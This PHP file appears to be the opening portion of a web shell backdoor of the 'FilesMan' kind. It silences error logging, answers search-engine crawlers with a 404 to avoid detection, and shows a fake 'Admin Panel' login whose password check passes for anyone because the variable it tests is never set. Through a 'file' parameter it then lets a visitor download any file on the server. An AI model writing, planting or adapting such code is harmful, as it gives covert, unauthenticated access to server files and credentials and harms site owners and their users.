<?php
session_start();
@error_reporting(0);
@set_time_limit(0);
	if(version_compare(PHP_VERSION, '5.3.0', '<')) {
		@set_magic_quotes_runtime(0);
	}
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

$pass = false;
$color 				= "#00ff00";
$default_action 	= 'FilesMan';
$default_use_ajax 	= true;
$default_charset 	= 'UTF-8';

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
	if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		header('HTTP/1.0 404 Not Found');
		exit;
	}
}


function login_shell() {
?>
<!doctype html>
<html lang="en">
<head>
	<!-- Required meta tags -->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

	<!-- Bootstrap CSS -->
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">

	<title>Admin Panel</title>
</head>
<body>
	<div class="container">

		<div class="row">
			<div class="col-md-4 offset-md-4">

				<div class="card mt-5">
					<div class="card-title text-center">
						<h1>Login Form</h1>
					</div>
					<div class="card-body">
						<form action="" method="post">
							
							<div class="form-group">
								<label for="password">Password</label>
								<input type="password" name="pass" class="form-control" id="password" placeholder="Password">
							</div>

							<button type="submit" class="btn btn-primary">Submit</button>
						</form>

					</div>
				</div>
			</div>

		</div>

	</div>
</body>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
if( empty($password) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $password) ) ) 
	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
else
login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
?>
